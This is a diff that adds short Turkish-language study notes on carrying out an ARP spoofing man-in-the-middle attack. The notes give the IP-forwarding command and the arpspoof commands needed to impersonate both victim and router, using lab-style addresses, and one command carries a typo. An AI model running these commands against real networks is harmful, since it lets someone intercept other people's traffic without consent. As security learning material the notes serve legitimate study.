@@ -1,0 +1,16 @@
+-----------------ARP SALDIRISI-----------------
+ARP = Address resolution protocol(adres cozumleme protokolu)
+
+NOT !! Bizim bu saldiridaki amacimiz man in the middle olmaktir. Yani hedefimiz modeme kendimizi hedefledigimiz cihaz gibi tanitmak; hedefledigimiz cihaza ise kendimizi modem gibi tanitmaktir. Bunu yapmak icin ise man in the middle framework(mitmf) ve bettercap kullanilabilir. iki saldiri cesidinde de ipler kullanilacaktir.
+yani oncelikle ipler tespit edilmelidir.
+
+Kullanicinin arp saldirisi esnasinda internete erisiminin devam etmesi icin ilk once ip forwarding yapmaliyiz.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+NOT: echo 1= sagda belirtilen dosya icerisine(ip_forward) 1 yaz demek. Eger dosya icerisinde 1 yaziyorsa ip forwarding etkin haldedir yazmiyorsa degildir.Bu islem her kali linux acildigida bastan yapilmalidir. Her seferinde sifirlanir.
+
+arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+NOT: spoof = sazanlama
+     -i = bizim o anki interface imiz wlan0/eth0
+     -t(target) = ilk olarak hedeflenen pcnin ip sonra modemin ip
+**sonra ayni islem modem de spooflanacagi icin onun icin de yeni bir terminalde yapilmalidir.
+arpspoof -i et0 -t 10.0.2.1 10.0.2.15 
